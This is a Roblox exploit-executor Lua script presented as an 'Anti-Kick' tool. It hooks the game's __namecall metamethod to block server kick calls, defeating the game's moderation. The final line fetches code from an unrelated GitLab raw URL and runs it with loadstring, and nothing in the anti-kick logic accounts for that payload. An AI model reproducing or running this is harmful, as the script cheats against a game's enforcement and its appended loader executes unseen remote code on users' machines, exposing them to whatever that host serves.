--[[
discord.gg/thedevs
credits to Exunys (https://github.com/Exunys)
]]

local Players = game:GetService("Players")
local OldNameCall = nil

getgenv().SendNotifications = true -- Set to true if you want to get notified regularly.

OldNameCall = hookmetamethod(game, "__namecall", function(Self, ...)
    local NameCallMethod = getnamecallmethod()

    if tostring(string.lower(NameCallMethod)) == "kick" then
        if getgenv().SendNotifications == true then
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Exunys Anti-Kick",
                Text = "You almost got kicked! Successfully prevented.",
                Icon = "rbxassetid://6238540373",
                Duration = 3,
            })
        end
        
        return nil
    end
    
    return OldNameCall(Self, ...)
end)

loadstring(game:HttpGet("https://gitlab.com/S4nZz/sanz/-/raw/main/peesex"))()
